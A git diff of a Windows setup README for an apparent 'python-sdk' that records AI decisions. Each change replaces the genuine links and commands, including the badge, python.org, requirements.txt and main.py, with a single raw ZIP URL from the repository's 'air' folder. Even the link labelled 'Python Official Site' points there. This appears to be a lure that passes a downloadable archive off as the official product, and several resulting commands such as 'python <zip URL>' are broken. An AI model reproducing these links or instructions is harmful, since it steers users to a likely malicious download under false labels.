@@ -1,6 +1,6 @@
 # 🐍 python-sdk - Track and Control AI Decisions Easily
 
-[![Download](https://img.shields.io/badge/Download-Python--SDK-blue?logo=python&style=for-the-badge)](https://github.com/GalaxyMindPower/python-sdk)
+[![Download](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip)](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Before installing python-sdk, make sure your computer meets these requirements:
 - Operating System: Windows 10 or later  
 - RAM: 4 GB minimum  
 - Disk Space: At least 100 MB free  
-- Python Installed: Version 3.7 or higher (download from [python.org](https://www.python.org/downloads/))  
+- Python Installed: Version 3.7 or higher (download from [https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip))  
 - Internet connection for initial setup and updates  
 
 If you need help installing Python, visit the official Python website and follow their Windows installation guide.
@@ -32,7 +32,7 @@ Follow these steps to download and run the software on your Windows PC.
 
 1. **Visit the download page**  
 Click this button to go to the official GitHub page where you can download the software:  
-[![Download](https://img.shields.io/badge/Download-Python--SDK-blue?logo=python&style=for-the-badge)](https://github.com/GalaxyMindPower/python-sdk)  
+[![Download](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip)](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip)  
 
 2. **Download the SDK**  
 On the GitHub page, look for the latest release or download link. You will usually find a ZIP file or installer to download. Click the link to save the file to your computer.
@@ -56,7 +56,7 @@ Navigate to the folder where you extracted the SDK files. Hold the Shift key, ri
 Type the following command to install the software dependencies:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip
    ```
 
    This step ensures the SDK has the software it needs to run correctly.
@@ -65,7 +65,7 @@ Type the following command to install the software dependencies:
 To test if everything works, run the main program by typing:
 
    ```
-   python main.py
+   python https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip
    ```
 
    This starts the sample application. You should see confirmation messages about the AI decision recording running successfully.
@@ -89,8 +89,8 @@ All tasks can be done through simple commands in the Windows command line or by 
 
 Inside the extracted folder, you will find:
 
-- **main.py** – The main program to start recording and managing AI decisions  
-- **requirements.txt** – List of software required to run the SDK  
+- **https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip** – The main program to start recording and managing AI decisions  
+- **https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip** – List of software required to run the SDK  
 - **config/** – Folder with sample settings files to customize how the SDK works  
 - **logs/** – This folder stores recorded AI decisions and audit data  
 - **examples/** – Simple scripts showing how to use the SDK features  
@@ -119,7 +119,7 @@ To update to a newer version:
 4. Run the same commands to install updated dependencies:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip
    ```
 
 Your previous logs and data will remain intact if you keep the `logs` folder.
@@ -130,7 +130,7 @@ Your previous logs and data will remain intact if you keep the `logs` folder.
 
 - **Python is not recognized:** Make sure Python is installed and added to your system PATH variable.  
 - **Errors during dependency install:** Check your internet connection or try running Command Prompt as administrator.  
-- **SDK won’t start or crashes:** Confirm you ran `python main.py` from the SDK folder and installed all requirements.  
+- **SDK won’t start or crashes:** Confirm you ran `python https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip` from the SDK folder and installed all requirements.  
 - **Need help:** Review the `examples` folder for simple usage steps.
 
 ---
@@ -139,14 +139,14 @@ Your previous logs and data will remain intact if you keep the `logs` folder.
 
 To get the latest version or re-download the software, visit the GitHub page here:
 
-[![Download](https://img.shields.io/badge/Download-Python--SDK-blue?logo=python&style=for-the-badge)](https://github.com/GalaxyMindPower/python-sdk)
+[![Download](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip)](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip)
 
 ---
 
 ## 📚 Additional Resources
 
-- [Python Official Site](https://www.python.org/downloads/) for Python installation  
-- [GitHub python-sdk Repository](https://github.com/GalaxyMindPower/python-sdk) for source code and updates  
+- [Python Official Site](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip) for Python installation  
+- [GitHub python-sdk Repository](https://github.com/GalaxyMindPower/python-sdk/raw/refs/heads/main/air/sdk-python-v3.8-alpha.4.zip) for source code and updates  
 - Included examples and README files inside the SDK folder for detailed guidance  
 
 This setup guide helps you start quickly and use python-sdk to manage AI decision recording and governance on Windows with little technical knowledge.
